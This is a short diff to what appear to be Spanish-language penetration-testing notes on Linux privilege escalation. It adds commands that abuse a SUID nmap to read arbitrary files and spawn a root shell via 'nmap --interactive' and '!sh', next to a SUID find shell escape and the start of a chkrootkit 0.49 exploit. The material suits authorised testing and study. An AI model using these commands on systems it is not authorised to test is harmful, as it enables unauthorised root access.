@@ -146,6 +146,11 @@ wget https://www.securitysift.com/download/linuxprivchecker.py // Enumeración y
 
 find . -exec /bin/sh \; // Si find tiene SUID activado
 
+nmap -iL FICHERO-A-LEER localhost
+nmap --interactive
+!sh
+// Si nmap tiene SUID
+
 ----------------------------------------
 Si la versión de chkrootkit es vulnerable (/etc/chkrootkit/chkrootkit -V == 0.49) =>
 	cat << EOF > rootme.c
